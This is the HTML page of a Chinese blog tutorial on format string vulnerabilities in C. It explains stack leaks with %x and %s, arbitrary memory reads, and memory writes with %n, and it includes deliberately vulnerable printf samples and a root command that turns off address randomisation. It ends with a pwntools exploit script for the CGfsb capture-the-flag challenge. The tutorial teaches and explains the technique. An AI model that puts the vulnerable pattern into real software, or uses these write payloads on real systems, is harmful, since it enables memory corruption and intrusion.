@@ -1,0 +1,700 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>格式化字符串漏洞 | Du4t的博客 | Du4t~~~~</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="RE">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"Du4t","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class>
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/100.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Du4t</h5>
+          <a href="mailto:610109615@qq.com" title="610109615@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>5</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/Du4t" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class>
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/categories">
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>格式化字符串漏洞</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">格式化字符串漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-08T12:17:25.000Z" itemprop="datePublished" class="page-time">
+  2019-10-08
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-格式化字符串漏洞" class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">格式化字符串漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-08 20:17:25" datetime="2019-10-08T12:17:25.000Z" itemprop="datePublished">2019-10-08</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于正常且安全的使用==printf函数==是这样操作的</p>
+<pre><code>#include <stdio.h>
+
+int main(void)
+{
+    int n=5;
+    printf("%d",n);
+    return 0;
+}</stdio.h></code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
+<pre><code>#include <stdio.h>
+
+int main(void)
+{
+    char a[]="qwerdf";
+    printf(a);
+    return 0;
+}</stdio.h></code></pre><p>对于printf函数来说 它的函数原型是</p>
+<blockquote>
+<p>printf(“格式化字符串”,参量1,参量2….)<br>如果输出成功返回输出的字数 如果输出失败则返回负数<br>格式化字符串 可以是以’%’开头的后跟特定字符来确定输出样式的 也可以是正常的字符串</p>
+</blockquote>
+<p>但是由于函数调用的关系 实参和形参结合的顺序是从左向右结合的 所以函数这样写也是可以正常输出的</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190923193449792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190923193449792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>以上代码 本身没有什么问题 但是如果用户可以控制输入的话 就会造成一些意想不到的结果
+
+<pre><code>#include <stdio.h>
+int main(void)
+{
+    char a[100];
+    scanf("%s",a);
+    printf(a);
+    return 0;
+ } </stdio.h></code></pre><figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190923195130178.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
+<blockquote>
+<p>同样的 如果我们输入的是%s 且在内存地址上正好有个字符串 我们就可以将内存中的字符串输出出来</p>
+</blockquote>
+<p>通过这种方式 我们就可以做到栈数据泄露</p>
+<h2 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h2><blockquote>
+<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 > /proc/sys/kernel/randomize_va_space</p>
+</blockquote>
+<p>首先我们需要明确一点 所有的局部变量都是在栈中存放着 所以如果我们能泄露出来某个字符串的地址 我们就有机会直接读取到内存中这个字符串的值 </p>
+<p>首先给出利用代码</p>
+<blockquote>
+<p>   关于如何写入地址的问题 菜鸡也不会在scanf的情况下写入地址 可能只有对照的ASCII码表进行输入了吧<br>所以在接下来的程序中 以命令行参数的形式向程序输入<br>因为 在命令行中 可以使用printf函数来将shellcode编码转换成字符</p>
+</blockquote>
+<pre><code>#include <stdio.h>
+#include <string.h>
+int main(int argc,char **argv)
+{
+    char a[100];
+    strcpy(a,argv[1]);
+    char flag[100]={"flag"};  
+    printf("%p\n",flag);
+    printf(a);
+    printf("\n");
+    return 0;
+}</string.h></stdio.h></code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190923212726366.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显
+
+<blockquote>
+<p>%< Number >$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
+</blockquote>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190923213014599.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/2019092321331572.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
+<h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><blockquote>
+<p>首先先介绍一种不常见的 格式说明符’%n’ 它的作用并不是像%c %d那样说明格式 而是将%n之前的字符个数赋值给一个变量</p>
+</blockquote>
+<p>这里先给出实验代码</p>
+<pre><code>#include <stdio.h>
+#include <string.h>
+int main(int argc,char **argv)
+{
+    char a[100];
+    static int b=0;
+    strcpy(a,argv[1]);
+    printf("The addr of b is %p\n",&b);
+    printf(a);
+    printf("\n");
+    printf("The value of b is %d\n",b);
+    return 0;
+}</string.h></stdio.h></code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190924181656618.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>尝试在运行程序时 使用printf写入地址
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/2019092418190293.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/2019092418215847.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可 </p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190924182308483.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<h2 id="格式化字符串的应用"><a href="#格式化字符串的应用" class="headerlink" title="格式化字符串的应用"></a>格式化字符串的应用</h2><blockquote>
+<p>这里使用攻防世界 PWN模块的 CGfsb 作为例题</p>
+</blockquote>
+<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190924184625528.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+
+<blockquote>
+<p>这里需要介绍一款工具 pwntools 它是python的一个库 平时主要常用其中的模块有</p>
+<ul>
+<li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<ul>
+<li>dynelf : 用于远程符号泄漏，需要提供leak方法</li>
+<li>elf : 对elf文件进行操作</li>
+<li>gdb : 配合gdb进行调试</li>
+<li>memleak : 用于内存泄漏</li>
+<li>shellcraft : shellcode的生成器</li>
+<li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li>
+<li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li>
+</ul>
+</li>
+</ul>
+<p>其中比较关键的函数有</p>
+<ul>
+<li>连接</li>
+</ul>
+<pre><code>#本地连接 a=process("程序路径")
+
+#远程连接 a=remote("主机ip","端口号")
+
+#关闭连接 a.close()</code></pre><ul>
+<li>IO</li>
+</ul>
+<pre><code>#发送数据 
+a.send("发送的数据")
+
+#发送一行数据 相当于在数据后加个\n 
+a.sendline("发送的数据“)
+
+#接受数据
+a.recv(numb=接受的字节数,timeout=指定超时时间)
+
+#接受一行数据 keepends为是否保留结尾的\n 
+a.recvline(keepends=?)
+
+#接受数据直到我们设置的标志出现 
+a.recvuntil("标志数据")
+
+#一直接收数据 直到EOF 
+a.recvall()
+
+#持续接收直到EOF或者timeout 
+a.recvrepeat(timeout=default)
+
+#直接进行交互 相当于回到shell的模式 在取得sell之后使用 
+a.interactive()</code></pre><p>如果需要继续深入的学习可以参考大佬的博客 <a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">https://www.jianshu.com/p/355e4badab50</a></p>
+</blockquote>
+<pre><code>from pwn import *
+
+#建立本地连接
+sh=process("./example")
+
+#设置标志接受
+sh.recvline("please tell me your name:")
+
+#回复程序以继续运行
+sh.send("AAAA")
+
+sh.recvline("leave your message please:")
+
+#设置pwnme的地址 这里的p32是将数据转为小端存储
+pwnme=p32(0x0804A068)
+
+#输出payload修改pwnme的值
+sh.send(pwnme+"0000%10$n")
+
+#程序持续运行
+sh.interactive()</code></pre><p>运行脚本 得到flag</p>
+<figure class="image-box">
+                <a rel="格式化字符串漏洞" href="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-10-08T12:17:41.347Z" itemprop="dateUpdated">2019-10-08 20:17:41</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/" target="_blank" rel="external">http://Du4t.github.io/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/</a>
+        
+    </div>
+    <footer>
+        <a href="http://Du4t.github.io">
+            <img src="/img/100.jpg" alt="Du4t">
+            Du4t
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/">RE</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/&title=《格式化字符串漏洞》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/&title=《格式化字符串漏洞》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">攻防世界PWN新手练习区WP</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/10/08/ni-xiang-chang-jian-de-suan-fa/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">No title</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞成因"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞成因</span></a></li></ol><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#内存读取"><span class="post-toc-number"></span> <span class="post-toc-text">内存读取</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#内存修改"><span class="post-toc-number"></span> <span class="post-toc-text">内存修改</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#格式化字符串的应用"><span class="post-toc-number"></span> <span class="post-toc-text">格式化字符串的应用</span></a>
+            </li></nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Du4t © 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/&title=《格式化字符串漏洞》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/&title=《格式化字符串漏洞》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACpElEQVR42u3aMXIjMQwEQP3/077ksiutZwBSp6A3ckkil82AoAG8XvHz8+Zpf/k86vnzd7858ODh4eEdWvq/U7+DtZ88z5y8JR+Fh4eHd4+XH8r5FiSBpJ2/DjB4eHh4X8DLkftj/cDVHA8PD+8LeMlC2/ln78XDw8P7v7xZ+rUFz5beXt/x8PDwbvPyKtL3/H2lvoeHh4e3rqrP0gTPb9knGorV4uHh4V3g5QduW8TKR+WtBsN14uHh4R3lPQ/bBIzNgZ6X1n5J5uLh4eFd4CWLmAWP/XYkpbIDiQk8PDy8o4nanJof6Hko2mwlHh4e3j3e5sLaHvebjVsVwPDw8PCu8Z6RbTm/bdJqy2ZRCQ0PDw/vg7x86e1G7JOzRboEDw8P7wKvPcSfX3aqmSAfVWdZ8PDw8A7x9oWoPCQk384u1lHrAB4eHt6aN2tyaheXX8eT437YU4aHh4d3gTdLy+bFsNnGtQ0ERbzCw8PDG/FmB3EeDIpkQbmS/PKNh4eHd483Sy601M1b2sQuHh4e3g1e3jCa8DZJjU2gejsKDw8P7wIvn3rWBDBrvUrmLK7UeHh4eBd4bZk/CQ9JqjcPOTmv2F08PDy8Na9F5p+0Za1TLQh4eHh4n+G1S8zbDlrwT/n8kqXGw8PDu8DLy1ftNTqv4ycrGTZd4eHh4V3gtamE9ujPGbNUMh4eHt7neXmQ2Kdo9yGhSObi4eHhHeVt/uFPrs6bRW8u33+/xcPDw7vAO9yxNZohuaznAex1dnF4eHh4wYs3Ra99o0AehJIEMR4eHt5t3qwANvv9xQiGh4eH9/W8HJlg8rFFOhgPDw/vC3ibEzgPG5sWBDw8PLzP8DaF/3zpySYeblrFw8PDu8Br/6Nvj/L6ElwW3g6kM/Dw8PBS3h+ryA0Bx3Yh4wAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '死鬼去哪里了！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
